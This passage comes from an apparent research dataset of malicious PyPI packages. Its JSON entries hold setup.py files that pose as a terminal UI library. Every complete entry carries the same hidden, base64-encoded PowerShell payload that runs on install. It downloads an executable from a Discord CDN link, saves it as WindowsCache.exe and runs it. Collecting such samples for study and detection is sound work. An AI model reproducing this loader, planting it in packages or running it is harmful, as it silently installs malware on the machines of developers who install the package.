'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqnvidiavmget-v1.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiavmget',\n    packages = ['modlib'],\n    version = '2.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqosintcraftram-v4.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqosintcraftram',\n    packages = ['modlib'],\n    version = '8.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqpaypalpongcc-v6.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpaypalpongcc',\n    packages = ['modlib'],\n    version = '6.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqpaypalvisaencode-v1.7",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpaypalvisaencode',\n    packages = ['modlib'],\n    version = '8.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqposthackedver-v2.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqposthackedver',\n    packages = ['modlib'],\n    version = '7.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqproofvisacandy-v10.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofvisacandy',\n    packages = ['modlib'],\n    version = '3.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqpullhackedstudy-v10.24",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpullhackedstudy',\n    packages = ['modlib'],\n    version = '7.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqpywpepcraft-v7.19",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpywpepcraft',\n    packages = ['modlib'],\n    version = '10.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrandompullad-v5.98",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandompullad',\n    packages = ['modlib'],\n    version = '9.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrandpippush-v6.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandpippush',\n    packages = ['modlib'],\n    version = '10.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqreplacegrandpep-v6.68",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqreplacegrandpep',\n    packages = ['modlib'],\n    version = '7.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqreultramask-v6.89",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqreultramask',\n    packages = ['modlib'],\n    version = '5.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstudypiprand-v3.32",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstudypiprand',\n    packages = ['modlib'],\n    version = '9.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqurlosinthydra-v10.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 